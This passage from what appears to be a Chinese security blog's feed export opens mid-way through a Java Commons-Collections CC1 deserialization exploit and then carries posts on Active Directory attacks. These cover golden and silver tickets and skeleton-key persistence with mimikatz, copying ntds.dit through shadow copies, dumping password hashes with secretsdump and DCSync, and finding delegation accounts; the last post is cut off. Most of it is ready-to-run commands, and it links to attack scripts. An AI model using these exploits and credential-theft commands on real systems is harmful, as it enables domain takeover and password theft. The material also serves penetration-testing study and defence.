Class[]{Object.class,Object[].class},new Object[]{null,null}),<br>                new InvokerTransformer(“exec”,new Class[]{String.class},new String[]{“calc.exe”}<br>                )<br>        });</p><pre><code>    Map map = new HashedMap();    map.put(&quot;value&quot;,&quot;1&quot;);    Map outmap = LazyMap.decorate(map,chainedTransformer);    Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);    Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);    constructor.setAccessible(true);    InvocationHandler invocationHandler = (InvocationHandler)constructor.newInstance(Retention.class,outmap);    Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,invocationHandler);    invocationHandler = (InvocationHandler)constructor.newInstance(Retention.class,proxymap);    FileOutputStream f = new FileOutputStream(&quot;payload.bin&quot;);    ObjectOutputStream fout = new ObjectOutputStream(f);    fout.writeObject(invocationHandler);    FileInputStream fi = new FileInputStream(&quot;payload.bin&quot;);    ObjectInputStream fin = new ObjectInputStream(fi);    Object o = (Object) fin.readObject();&#125;</code></pre><p>}</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>也可以完成利用<br><br>## 调用链展示<br></code></pre></td></tr></table></figure><p>ObjectInputStream.readObject()<br>  AnnotationInvocationHandler.readObject()<br>    Map(Proxy).entrySet()<br>      AnnotationInvocationHandler.invoke()<br>        LazyMap.get()<br>          ChainedTransformer.transform()<br>            ConstantTransformer.transform()<br>            InvokerTransformer.transform()<br>              Method.invoke()<br>                Class.getMethod()<br>            InvokerTransformer.transform()<br>              Method.invoke()<br>                Runtime.getRuntime()<br>            InvokerTransformer.transform()<br>              Method.invoke()<br>                Runtime.exec()</p><pre><code># 防御在在Java 8u71以后，官方修改了AnnotationInvocationHandler.readObject()方法，在其他新添了一个LinkedHashMap对象，并把原来的键值添加进去，导致我们不能通过AnnotationInvocationHandler在高版本利用CC1# 小结本文介绍了CC1链的两种利用方式，并给出了完整POC</code></pre>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Common-Collections</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透之驻留技术</title>
    <link href="/2021/08/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E9%A9%BB%E7%95%99%E6%8A%80%E6%9C%AF/"/>
    <url>/2021/08/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E9%A9%BB%E7%95%99%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当我们拿到域控权限之后，需要持续稳定的控下域控，因此需要用到驻留技术，维持域控权限</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文将讲述以下内容</p><ul><li>黄金门票</li><li>白银门票</li><li>GPO组策略推送</li><li>Skelecton Key 万能钥匙</li></ul><h1 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h1><p>Kerberos黄金票据是有效的TGT Kerberos票据，因为它是由域Kerberos帐户（KRBTGT）加密和签名的  。TGT仅用于向域控制器上的KDC服务证明用户已被其他域控制器认证。TGT被KRBTGT密码散列加密并且可以被域中的任何KDC服务解密的。</p><p>黄金票据的条件要求：</p><ul><li>域名称[AD PowerShell模块：（Get-ADDomain）.DNSRoot]</li><li>域的SID 值[AD PowerShell模块：（Get-ADDomain）.DomainSID.Value]</li><li>域的KRBTGT账户NTLM密码哈希</li><li>伪造用户名</li></ul><p>1、获取krbtgt的hash值和域sid</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">lsadump:</span>:dcsync /domain:god<span class="hljs-meta">.org</span> /user:krbtgt<br></code></pre></td></tr></table></figure><p><img src="/img/23.png"></p><p>2、生成Golden Ticket<br>​ 得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。</p><ul><li>/admin：伪造的用户名</li><li>/domain：域名称</li><li>/sid：SID值，注意是去掉最后一个-后面的值</li><li>/krbtgt：krbtgt的HASH值</li><li>/ticket：生成的票据名称</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kerberos</span>::golden /admin:administrator /domain:<span class="hljs-number">0</span>day.org /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1812960810</span>-<span class="hljs-number">2335050734</span>-<span class="hljs-number">3517558805</span> /krbtgt:<span class="hljs-number">36</span>f<span class="hljs-number">9</span>d<span class="hljs-number">9</span>e<span class="hljs-number">6</span>d<span class="hljs-number">98</span>ecf<span class="hljs-number">8307</span>baf<span class="hljs-number">4</span>f<span class="hljs-number">46</span>ef<span class="hljs-number">842</span>a<span class="hljs-number">2</span> /ticket:golden.kiribi<br></code></pre></td></tr></table></figure><p><img src="/img/24.png"></p><p>3、导入票据<br>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::purge<br>kerberos::ppt golden.kiribi<br>kerberos::list<br></code></pre></td></tr></table></figure><p><img src="/img/25.png"></p><p>4、此时就可以通过dir成功访问域控的共享文件夹。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\owa.god.org\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure><p><img src="/img/26.png"></p><h1 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h1><p>当拥有Server(Service) Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。<br>Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。 所以，一切凭据都来源于Server Hash。</p><p>参数说明</p><ul><li>/domain：当前域名称</li><li>/sid：SID值，和金票一样取前面一部分</li><li>/target：目标主机，这里是pc.de1ay.com</li><li>/service：服务名称，这里需要访问共享文件，所以是cifs</li><li>/rc4：目标主机的HASH值</li><li>/user：伪造的用户名</li><li>/ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入</li></ul><p>伪造票据</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">mimikatz “kerberos::golden /domain:<span class="hljs-params">&lt;域名&gt;</span> /sid:<span class="hljs-params">&lt;域 SID&gt;</span> /target:<span class="hljs-params">&lt;目标服务器主机名&gt;</span> /service:<span class="hljs-params">&lt;服务类型&gt;</span> /rc4:<span class="hljs-params">&lt;NTLM Hash&gt;</span> /user:<span class="hljs-params">&lt;用户名&gt;</span> /ptt<span class="hljs-string">&quot; exit</span><br></code></pre></td></tr></table></figure><p><img src="/img/27.png"></p><p>查看文件夹</p><p><img src="/img/28.png"></p><p>各种服务中的示例</p><ul><li>Service Type    Service Silver Tickets  </li><li>WMI    HOST RPCSS  </li><li>PowerShell Remoting    HOST HTTP  </li><li>WinRM    HOST HTTP  </li><li>Scheduled Tasks    HOST  </li><li>Windows File Share (CIFS)    CIFS  </li><li>LDAP operations includingMimikatz DCSync    LDAP  </li><li>Windows Remote Server Administration Tools    RPCSS LDAP CIFS  </li></ul><h1 id="GPO策略推送"><a href="#GPO策略推送" class="headerlink" title="GPO策略推送"></a>GPO策略推送</h1><p>组策略对象（Group Policy object）是组策略的组件，可用来控制Microsoft系统中用户帐户和计算机帐户的资源。</p><p>组策略对象根据不同的组策略设置在活动目录（Active Directory）系统中得以实现，可包含多种不同配置，例如用户的密码复杂性、为某些用户禁用本地管理等。</p><p>这意味着，如果你能够控制某处的GPO，那么你就可以控制任何东西。</p><h1 id="Skelecton-Key-万能钥匙"><a href="#Skelecton-Key-万能钥匙" class="headerlink" title="Skelecton Key 万能钥匙"></a>Skelecton Key 万能钥匙</h1><p>skeleton key就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注入，重启后会失效。</p><p>1、域控中安装skeleton key</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">mimikatz.exe privilege::<span class="hljs-builtin-name">debug</span> <span class="hljs-string">&quot;misc::skeleton&quot;</span><br></code></pre></td></tr></table></figure><p>2、域内主机使用密码登录域控<br>用户名administrator<br>mimikatz的默认Skeleton Key设置为mimikatz</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> * /delete /y 清除连接<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\owa.god.org\c$ mimikatz /user:tide\administrator 建立连接<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> 查看连接<br></code></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本文主要介绍了在域渗透中的一些隐蔽驻留方式</p>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>驻留技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透之NTDS</title>
    <link href="/2021/07/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BNTDS/"/>
    <url>/2021/07/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BNTDS/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Ntds.dit是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。本文将归纳总结NTDS.dit获取技术和hash导出技术。</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文主要内容</p><blockquote><p>NTDS.dit获取<br>从NTDS.dit中导出Hash<br>在线获取Hash</p></blockquote><h1 id="NTDS-dit获取"><a href="#NTDS-dit获取" class="headerlink" title="NTDS.dit获取"></a>NTDS.dit获取</h1><h2 id="vssadmin工具获取NTDS-dit"><a href="#vssadmin工具获取NTDS-dit" class="headerlink" title="vssadmin工具获取NTDS.dit"></a>vssadmin工具获取NTDS.dit</h2><p>vssadmin是Windows上的一个卷影拷贝服务的命令行管理工具，可用于创建和删除卷影拷贝、列出卷影拷贝的信息，显示已安装的所有卷影拷贝写入程序和提供程序，以及改变卷影拷贝的存储空间的大小等。</p><h3 id="适用情景"><a href="#适用情景" class="headerlink" title="适用情景"></a>适用情景</h3><ul><li>Windows 10</li><li>Windows 8.1</li><li>Windows Server 2016</li><li>Windows Server 2012 R2</li><li>Windows Server 2012</li><li>Windows Server 2008 R2</li><li>Windows Server 2008</li></ul><p><font color="#0366d6"><strong>1、创建一个C盘的卷影拷贝</strong></font></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">vssadmin create shadow /<span class="hljs-attribute">for</span>=C:<br></code></pre></td></tr></table></figure><p><img src="/images/43.png"></p><p><font color="#0366d6"><strong>2、在创建的卷影拷贝中将ntds.dit复制到C盘中</strong></font></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">copy <span class="hljs-symbol">\\</span>?<span class="hljs-symbol">\G</span>LOBALROOT<span class="hljs-symbol">\D</span>evice<span class="hljs-symbol">\H</span>arddiskVolumeShadowCopy1<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\n</span>tds<span class="hljs-symbol">\n</span>tds.dit C:<span class="hljs-symbol">\n</span>tds.dit<br></code></pre></td></tr></table></figure><p><img src="/images/44.png"></p><p><font color="#0366d6"><strong>3、删除创建的卷影拷贝</strong></font></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vssadmin <span class="hljs-keyword">delete</span> shadows <span class="hljs-regexp">/for=c: /</span>quiet<br></code></pre></td></tr></table></figure><p><img src="/images/45.png"></p><h2 id="利用vssown-vbs脚本获取NTDS-dit"><a href="#利用vssown-vbs脚本获取NTDS-dit" class="headerlink" title="利用vssown.vbs脚本获取NTDS.dit"></a>利用vssown.vbs脚本获取NTDS.dit</h2><p>该脚本是通过调用wmi对ShadowCopy进行操作，其功能与vssadmin类似，可用于创建和删除卷影拷贝，以及启动和停止卷影拷贝服务。</p><p>下载地址：<code>https://raw.githubusercontent.com/errorecho/penetration/main/Hash/vssown.vbs</code></p><p><font color="#0366d6"><strong>1、启动卷影拷贝服务</strong></font></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">cscript vssown.vbs /<span class="hljs-literal">start</span><br></code></pre></td></tr></table></figure><p><img src="/images/46.png"></p><p><font color="#0366d6"><strong>2、创建一个C盘的卷影拷贝</strong></font></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">cscript vssown.vbs <span class="hljs-string">/create</span> c<br>cscript vssown.vbs <span class="hljs-string">/list</span><br></code></pre></td></tr></table></figure><p><img src="/images/47.png"></p><p><font color="#0366d6"><strong>3、在创建的卷影拷贝中将ntds.dit复制到C盘中</strong></font></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">copy <span class="hljs-symbol">\\</span>?<span class="hljs-symbol">\G</span>LOBALROOT<span class="hljs-symbol">\D</span>evice<span class="hljs-symbol">\H</span>arddiskVolumeShadowCopy2<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\N</span>TDS<span class="hljs-symbol">\n</span>tds.dit C:<span class="hljs-symbol">\n</span>tds.dit<br></code></pre></td></tr></table></figure><p><img src="/images/48.png"></p><p><font color="#0366d6"><strong>4、删除刚刚创建的卷影拷贝</strong></font></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cscript</span> vssown.vbs /delete &#123;BD<span class="hljs-number">533060</span>-<span class="hljs-number">3761</span>-<span class="hljs-number">4</span>C<span class="hljs-number">9</span>D-B<span class="hljs-number">723</span>-<span class="hljs-number">9</span>A<span class="hljs-number">81405</span>D<span class="hljs-number">61</span>D<span class="hljs-number">2</span>&#125;<br><span class="hljs-attribute">cscript</span> vssown.vbs /stop<br></code></pre></td></tr></table></figure><p><img src="/images/49.png"></p><h2 id="利用Ntdsutil-exe工具获取NTDS-dit"><a href="#利用Ntdsutil-exe工具获取NTDS-dit" class="headerlink" title="利用Ntdsutil.exe工具获取NTDS.dit"></a>利用Ntdsutil.exe工具获取NTDS.dit</h2><p>Ntdsutil.exe 是一个为 Active Directory 提供管理设施的命令行工具，该工具被默认安装在了域控制器上，可以在域控上直接操作，也可以通过域内机器在域控上远程操作，但是需要管理员权限。</p><p><font color="#0366d6"><strong>1、创建快照</strong></font></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;activate instance ntds&quot;</span> create <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure><p><img src="/images/50.png"></p><p><font color="#0366d6"><strong>2、挂载快照</strong></font></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;mount &#123;116724cf-19ec-4464-87e9-331948272637&#125;&quot;</span> <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure><p><img src="/images/51.png"></p><p><font color="#0366d6"><strong>3、复制NTDS.dit</strong></font></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">copy C:<span class="hljs-symbol">\$</span>SNAP_202107141438_VOLUMEC$<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\N</span>TDS<span class="hljs-symbol">\n</span>tds.dit c:<span class="hljs-symbol">\n</span>tds.dit<br></code></pre></td></tr></table></figure><p><img src="/images/52.png"></p><p><font color="#0366d6"><strong>4、卸载并删除快照</strong></font></p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">ntdsutil snapshot &quot;unmount &#123;116724cf<span class="hljs-string">-19</span>ec<span class="hljs-string">-4464</span><span class="hljs-string">-87</span>e9<span class="hljs-string">-331948272637</span>&#125;&quot; &quot;delete &#123;116724cf<span class="hljs-string">-19</span>ec<span class="hljs-string">-4464</span><span class="hljs-string">-87</span>e9<span class="hljs-string">-331948272637</span>&#125;&quot; quit quit<br></code></pre></td></tr></table></figure><p><img src="/images/53.png"></p><h2 id="利用Ntdsutil-exe创建IFM提取Ntds-dit文件"><a href="#利用Ntdsutil-exe创建IFM提取Ntds-dit文件" class="headerlink" title="利用Ntdsutil.exe创建IFM提取Ntds.dit文件"></a>利用Ntdsutil.exe创建IFM提取Ntds.dit文件</h2><p>在使用ntdsutil创建创建媒体安装集(IFM)时，会自动进行生成快照、加载、将ntds.dit、计算机的SAM和SYSTEM文件复制到目标文件夹中等操作，我们可以利用该过程获取NTDS.dit文件，需要管理员权限。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ntdsutil</span> <span class="hljs-string">&quot;ac i ntds&quot;</span> <span class="hljs-string">&quot;ifm&quot;</span> <span class="hljs-string">&quot;create full c:/qwe&quot;</span> q q<br></code></pre></td></tr></table></figure><p><img src="/images/54.png"></p><p><img src="/images/55.png"></p><h2 id="利用powershell脚本Copy-VSS-ps1"><a href="#利用powershell脚本Copy-VSS-ps1" class="headerlink" title="利用powershell脚本Copy-VSS.ps1"></a>利用powershell脚本Copy-VSS.ps1</h2><p>下载地址：<code>https://raw.githubusercontent.com/errorecho/penetration/main/Hash/Copy-VSS.ps1</code></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">Set</span>-ExecutionPolicy <span class="hljs-comment">bypass</span><br>Import-Module <span class="hljs-comment">.\Copy-VSS.ps1</span><br>Copy-VSS <span class="hljs-comment">-DestinationDir C:\</span><br></code></pre></td></tr></table></figure><p><img src="/images/56.png"></p><h2 id="利用diskshadow获取NTDS-dit"><a href="#利用diskshadow获取NTDS-dit" class="headerlink" title="利用diskshadow获取NTDS.dit"></a>利用diskshadow获取NTDS.dit</h2><p>DiskShadow 是由微软官方签名的，Windows Server 2008、2012、2016 都包含了 DiskShadow，所在目录C:\windows\system32\diskshadow.exe。包含交互式命令和脚本模式。</p><p>diskshadow.txt</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">set context persistent nowriters<br>add volume c: alias someAlias<br>create<br>expose <span class="hljs-variable">%someAlias%</span> w:<br>exec &quot;c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe&quot; /c copy w:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\n</span>tds<span class="hljs-symbol">\n</span>tds.dit c:<span class="hljs-symbol">\n</span>tds.dit<br>delete shadows volume <span class="hljs-variable">%someAlias%</span><br>reset<br></code></pre></td></tr></table></figure><p>命令</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\d</span>iskshadow.exe /s C:<span class="hljs-symbol">\s</span>hadow.txt<br></code></pre></td></tr></table></figure><p><img src="/images/57.png"></p><h1 id="从NTDS-dit导出Hash"><a href="#从NTDS-dit导出Hash" class="headerlink" title="从NTDS.dit导出Hash"></a>从NTDS.dit导出Hash</h1><h2 id="利用secretsdump-exe"><a href="#利用secretsdump-exe" class="headerlink" title="利用secretsdump.exe"></a>利用secretsdump.exe</h2><p>下载地址：<code>https://github.com/errorecho/penetration/raw/main/Hash/secretsdump.exe</code></p><p>需要NTDS.dit和system.hiv文件</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">secretsdump.exe -<span class="hljs-keyword">system</span> c:\<span class="hljs-keyword">system</span>.hiv -ntds c:\ntds.dit <span class="hljs-built_in">local</span><br></code></pre></td></tr></table></figure><p><img src="/images/58.png"></p><h1 id="在线读取NTDS-dit中的Hash"><a href="#在线读取NTDS-dit中的Hash" class="headerlink" title="在线读取NTDS.dit中的Hash"></a>在线读取NTDS.dit中的Hash</h1><h2 id="利用powershell脚本Invoke-DCSync-ps1"><a href="#利用powershell脚本Invoke-DCSync-ps1" class="headerlink" title="利用powershell脚本Invoke-DCSync.ps1"></a>利用powershell脚本Invoke-DCSync.ps1</h2><p>下载地址：<code>https://raw.githubusercontent.com/errorecho/penetration/main/Hash/Invoke-DCSync.ps1</code></p><p>该脚本通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能，并利用dcsync直接读取ntds.dit得到域用户密码散列值。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-DCSync</span>.ps1<br><span class="hljs-built_in">Invoke-DCSync</span> <span class="hljs-literal">-DumpForest</span> | <span class="hljs-built_in">ft</span> <span class="hljs-literal">-wrap</span> <span class="hljs-literal">-autosize</span><br></code></pre></td></tr></table></figure><p><img src="/images/59.png"></p><h2 id="利用mimikatz的dcsync功能"><a href="#利用mimikatz的dcsync功能" class="headerlink" title="利用mimikatz的dcsync功能"></a>利用mimikatz的dcsync功能</h2><p>mimikatz有一个dcsync功能，可以利用卷影拷贝服务直接读取ntds.dit文件并检索域散列值。需要注意的是，必须使用域管理员权限运行mimikatz才可以读取ntds.dit</p><p>实现原理：</p><p>利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据</p><p>微软官方解释：</p><p>指定目录复制服务（DRS）远程协议，一种用于复制和管理Active Directory中数据的RPC协议。</p><p>利用条件：</p><p>获得以下任一用户的权限：</p><p>Administrators组内的用户<br>Domain Admins组内的用户<br>Enterprise Admins组内的用户<br>域控制器的计算机帐户</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">lsadump:<span class="hljs-function">:dcsync</span> <span class="hljs-string">/domain</span><span class="hljs-function">:doo.com</span> <span class="hljs-string">/all</span> <span class="hljs-string">/csv</span><br></code></pre></td></tr></table></figure><p><img src="/images/60.png"></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本文主要讲述了NTDS在域渗透中的作用，并介绍了多种导出NTDS的方法</p>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NTDS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透之委派</title>
    <link href="/2021/07/01/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E5%A7%94%E6%B4%BE/"/>
    <url>/2021/07/01/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E5%A7%94%E6%B4%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动</p><p>委派主要分为非约束委派(Unconstrained delegation)和约束委派(Constrained delegation)两个方式，还有一种是基于资源的约束委派(Resource Based Constrained Delegation)</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文主要讲述以下内容：</p><ul><li>非约束委派的利用</li><li>约束委派的利用</li><li>基于资源的约束委派的利用</li></ul><h1 id="什么是委派"><a href="#什么是委派" class="headerlink" title="什么是委派"></a>什么是委派</h1><p>Kerberos 委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。</p><p>假设用户A访问了服务B，服务B利用A的身份去请求服务C，这个身份借派的过程可以理解为委派。</p><h1 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h1><p>假如server1主机账户配置了非约束委派，那么域账户A在对server1主机账户旗下服务service1（例如cifs服务）产生kerberos认证的时候（例如dir \server1\c$）域账户会发送包含tgt的tgs给service1，然后service1就可以代表域账户A认证域内任何服务器。</p><p><img src="/images/1631087005474.png" alt="1631087005474.png"></p><h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><ol><li>用户通过发送KRB_AS_REQ消息请求可转发 TGT（forwardable TGT，为了方便我们称为TGT1）</li><li>KDC在KRB_AS_REP消息中返回TGT1</li><li>用户再通过TGT1向KDC请求转发TGT（forwardedTGT，我们称为TGT2）</li><li>在KRB_TGS_REP消息中返回转发TGT2</li><li>用户使用TGT1向KDC申请访问Service1的ST（ServiceTicket）</li><li>TGS返回给用户一个ST  </li><li>用户发送KRB_AP_REQ请求至Service1，这个请求中包含了TGT1和ST、TGT2、TGT2的SessionKey</li><li>Service1使用用户的TGT2通过KRB_TGS_REQ发送给KDC，以用户的名义请求能够访问Service2的票据</li><li>KDC在KRB_TGS_REP消息中返回Service2到Service1的票据</li><li>Service1以用户的名义向Service2发送KRB_AP_REQ请求</li><li>Service2响应步骤10中Service1的请求</li><li>Service1响应步骤7中用户的请求</li><li>在这个过程中的TGT转发机制，没有限制Service1对TGT2的使用，也就是说Service1可以通过TGT2来请求任意服务</li><li>KDC返回步骤13中请求的票据，15和16即为Service1通过模拟用户来访问其他Service</li><li>然后，服务1可以冒充用户访问服务N。</li><li>服务N将响应服务1，就如同响应用户访问一样。</li></ol><p>协议层面讲，用户委派service1访问service2服务，那么用户会将TGT缓存在service1的lsass中，DM再模拟这个用户去访问服务。</p><h2 id="设置非约束委派"><a href="#设置非约束委派" class="headerlink" title="设置非约束委派"></a>设置非约束委派</h2><p><img src="/images/1631171984639.png" alt="1631171984639.png"></p><h2 id="查找非约束委派账户"><a href="#查找非约束委派账户" class="headerlink" title="查找非约束委派账户"></a>查找非约束委派账户</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">AdFind.exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=god,DC=org&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> <span class="hljs-meta">cn</span> distinguishedName<br></code></pre></td></tr></table></figure><h2 id="查找非约束委派计算机"><a href="#查找非约束委派计算机" class="headerlink" title="查找非约束委派计算机"></a>查找非约束委派计算机</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">AdFind.exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=god,DC=org&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> <span class="hljs-meta">cn</span> distinguishedName<br></code></pre></td></tr></table></figure><h2 id="针对非约束委派计算机"><a href="#针对非约束委派计算机" class="headerlink" title="针对非约束委派计算机"></a>针对非约束委派计算机</h2><p>域控访问非约束委派计算机</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Enter</span><span class="hljs-operator">-</span><span class="hljs-variable">PSSession</span> <span class="hljs-operator">-</span><span class="hljs-variable">ComputerName</span> 指定主机名 访问<span class="hljs-variable">winrm</span>服务<br></code></pre></td></tr></table></figure><p>非约束委派计算机<br>mimikatz导出票据</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">privilege::debug<br>sekurlsa::ticket /<span class="hljs-keyword">export</span><br></code></pre></td></tr></table></figure><p><img src="/images/30.png"></p><p>导入票据</p><figure class="highlight 